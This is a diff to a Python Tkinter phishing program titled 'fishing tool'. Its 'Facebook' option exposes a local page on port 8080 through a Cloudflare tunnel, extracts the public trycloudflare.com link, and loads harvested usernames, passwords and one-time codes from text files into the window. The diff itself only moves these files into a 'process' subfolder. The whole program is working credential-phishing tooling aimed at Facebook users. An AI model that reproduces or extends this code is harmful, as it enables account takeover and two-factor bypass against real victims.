@@ -4,20 +4,20 @@ from tkinter.ttk import *
 def sites():
 	def fish():
 		def linkwindow():
-			f = open("assets/new.txt")
+			f = open("assets/process/new.txt")
 			copyplace.delete(0, END)
 			copyplace.insert(INSERT, f.read())
-		link = os.system("cd assets; hostit -f cloudflare 8080 > link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' 'link.txt' > new.txt; rm link.txt")
+		link = os.system("cd assets; hostit -f cloudflare 8080 > process/link.txt dev/null 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' 'process/link.txt' > process/new.txt; rm process/link.txt")
 		def uname():
-		 	g= open("assets/username.txt")
+		 	g= open("assets/process/username.txt")
 		 	unameplace.delete(0, END)
 		 	unameplace.insert(INSERT, g.read())
 		def pwget():
-			h = open("assets/password.txt")
+			h = open("assets/process/password.txt")
 			pwarea.delete(0, END)
 			pwarea.insert(INSERT, h.read())
 		def otpget():
-			i = open("assets/otp.txt")
+			i = open("assets/process/otp.txt")
 			otparea.delete(0, END)
 			otparea.insert(INSERT, i.read())
 		root3 = Tk()
@@ -54,7 +54,7 @@ def sites():
 	option1 = Button(root1, text = 'Facebook',style = 'W.TButton', command = fish).grid(row = 0, column = 0)
 	toolcloser = Button(root1, text = 'Quit !', style = 'W.TButton', command = root1.destroy).grid(row = 0, column = 1)
 	root1.mainloop()
-os.system("cd assets; rm new.txt")
+os.system("cd assets; rm process/new.txt")
 root = Tk()
 root.geometry('300x200')
 root.title("fishing tool")
